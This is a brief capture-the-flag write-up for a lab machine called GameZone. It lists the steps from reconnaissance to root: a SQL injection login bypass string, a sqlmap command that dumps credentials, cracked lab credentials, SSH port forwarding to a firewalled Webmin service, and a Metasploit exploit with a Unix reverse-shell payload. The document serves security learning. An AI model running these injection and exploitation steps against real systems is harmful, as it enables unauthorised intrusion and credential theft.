# CTF Writeup: GameZone

---

- Step 1: added <target_ip> to /etc/hosts & ran nmap scan --> 22,80 open
- Step 2: ran gobuster scan and found /images
- Step 3: made reverse image search to find name of the agent in the picture --> agent 47
- Step 4: added "' or 1=1 -- -" into username and left password blank --> sql injection
- Step 5: logged in successfully 
- Step 6: intercepted traffic with burpsuite & copied package in req.txt file
- Step 7: made sqlmap -r req.txt --dbms=mysql --dump --> retrieved user creds
- Step 8: decoded hashed password on crackstation --> creds = agent47:videogamer124
- Step 9: logged in via ssh --> retrieved user.txt flag
- Step 10: made ss-tulpn to see which services are running and blocked by firewall for the outside
tcp service running on port 10000 seems interesting
- Step 11: made ssh -L 10000:localhost:10000 agent47@gamezone.thm --> gained ssh
and was able to view the service on "localhost:10000" now.
- Step 12: made msfconsole -q --> made search Webmin 1.850 --> made use 0
- Step 13: set'd up all configurables --> show payloads selected cmd/unix/reverse -> set LHOST localhost
- Step 14: after it was created --> made sessions 1 --> gained root rce --> retrieved root flag

---

## Key Learnings

- Strengthened Knowledge about SQL Injections
- Strengthened Knowledge about Attack Vectors
- Learned about exposing services which are blocked for the outside
- Strengthened Knowledge in Metasploit
